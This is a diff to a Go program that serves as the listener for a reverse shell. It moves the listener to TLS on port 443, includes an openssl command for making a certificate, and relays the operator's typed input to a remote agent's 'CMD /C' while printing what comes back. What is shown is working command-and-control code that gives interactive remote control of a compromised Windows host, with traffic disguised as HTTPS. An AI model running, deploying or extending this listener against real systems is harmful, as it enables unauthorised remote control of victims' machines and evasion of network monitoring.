@@ -1,7 +1,9 @@
-// TODO: Encrypt with TLS. Add additonal features. Upload/Download?
+// Generate key pair:  openssl req -x509 -newkey rsa:4096 -sha256 -nodes -keyout server.key -out server.crt -days 7
+//TODO: Add ability to listen for multiple check ins
 package main
 
 import (
+	"crypto/tls"
 	"io"
 	"log"
 	"net"
@@ -13,21 +15,28 @@ type transfer struct {
 }
 
 func main() {
-	ln, err := net.Listen("tcp", "10.0.0.12:4444")
+	cer, err := tls.LoadX509KeyPair("server.crt", "server.key")
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
+		return
+	}
+
+	config := &tls.Config{Certificates: []tls.Certificate{cer}}
+	ln, err := tls.Listen("tcp", "192.168.180.139:443", config)
+	if err != nil {
+		log.Println(err)
 	}
 	log.Println("Waiting for Check-in")
-	con, err := ln.Accept()
+	conn, err := ln.Accept()
 	if err != nil {
 		log.Fatal(err)
 	}
-	log.Printf("Check-in from:[%s]!", con.RemoteAddr())
-	Streams(con)
+	log.Printf("Check-in from:[%s]!", conn.RemoteAddr())
+	Streams(conn)
 }
 
-func Streams(con net.Conn) {
-	c := make(chan transfer) // create a channel
+func Streams(conn net.Conn) {
+	c := make(chan transfer) // create a channel and throw it transfer (struct as defined above)
 
 	// Read from Reader and write to Writer until EOF
 	copy := func(r io.ReadCloser, w io.WriteCloser) {
@@ -37,16 +46,16 @@ func Streams(con net.Conn) {
 		}()
 		n, err := io.Copy(w, r)
 		if err != nil {
-			log.Printf("[%s]: ERROR: %s\n", con.RemoteAddr(), err)
+			log.Printf("[%s]: ERROR: %s\n", conn.RemoteAddr(), err)
 		}
 		c <- transfer{bytes: uint64(n)} // this is the struct that was defined in the beginning - sends progress into a channel - VAR n = Copy r/w
 	}
 
-	go copy(con, os.Stdout) // starts a go routine - copies con (accepted connection) to os.Stdout
-	go copy(os.Stdin, con)  // starts a go routine - copies os.Stdin to con - in this case "CMD /C" as defined on agent side
+	go copy(conn, os.Stdout) // starts a go routine - copies con (accepted connection) to os.Stdout
+	go copy(os.Stdin, conn)  // starts a go routine - copies os.Stdin to con - in this case "CMD /C" as defined on agent side
 
 	p := <-c
-	log.Printf("[%s]: Connection has been closed by remote peer, %d bytes has been receiv\n", con.RemoteAddr(), p.bytes)
+	log.Printf("[%s]: Connection has been closed by remote peer, %d bytes has been receiv\n", conn.RemoteAddr(), p.bytes)
 	p = <-c
-	log.Printf("[%s]: Local peer has been stopped, %d bytes has been sent\n", con.RemoteAddr(), p.bytes)
+	log.Printf("[%s]: Local peer has been stopped, %d bytes has been sent\n", conn.RemoteAddr(), p.bytes)
 }
